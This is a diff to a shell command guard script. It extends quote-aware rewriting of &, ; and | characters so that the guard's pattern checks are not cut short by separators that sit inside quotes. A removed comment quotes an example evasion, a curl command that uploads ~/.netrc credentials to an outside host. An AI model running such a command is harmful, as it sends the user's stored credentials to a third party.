@@ -105,21 +105,24 @@ strip_inert_heredocs() {
   printf '%s' "$rest"
 }
 
-# `&` inside quotes or a URL is not a command separator, but the guards' [^|;&]
-# spans stop at it, so `curl 'https://h/?a=1&b=2' -d @~/.netrc` hid its flags.
-# Rewritten to %26 for matching only; a bare & outside quotes still separates.
-neutralize_quoted_amps() {
-  case "$1" in *'&'*) ;; *) printf '%s' "$1"; return ;; esac
+# A quoted or backslash-escaped `&`, `;` or `|` is text, not a separator, but the
+# guards' [^|;&] spans stop at it and hid the flags after it. Rewritten to %26,
+# %3B, %7C for matching only. An unquoted one, URL or not, still separates.
+neutralize_quoted_separators() {
+  case "$1" in *'&'*|*';'*|*'|'*) ;; *) printf '%s' "$1"; return ;; esac
   printf '%s\n' "$1" | awk '
+    function hide(ch) { return ch == "&" ? "%26" : ch == ";" ? "%3B" : ch == "|" ? "%7C" : ch }
     BEGIN { q = "" }
-    { out = ""; url = 0
-      for (i = 1; i <= length($0); i++) {
+    { out = ""; n = length($0)
+      for (i = 1; i <= n; i++) {
         c = substr($0, i, 1)
-        if (q == "" && (c == "\"" || c == "\047")) q = c
-        else if (q != "" && c == q) q = ""
-        if (substr($0, i, 3) == "://") url = 1
-        else if (q == "" && (c == " " || c == "\t")) url = 0
-        if (c == "&" && (q != "" || url)) c = "%26"
+        if (c == "\\" && q != "\047") { out = out c hide(substr($0, i + 1, 1)); i++; continue }
+        if (q == "") {
+          if (c == "\047") q = (i > 1 && substr($0, i - 1, 1) == "$") ? "A" : "\047"
+          else if (c == "\"") q = "\""
+        } else if (c == "\047" && (q == "\047" || q == "A")) q = ""
+        else if (c == "\"" && q == "\"") q = ""
+        else c = hide(c)
         out = out c
       }
       print out }'
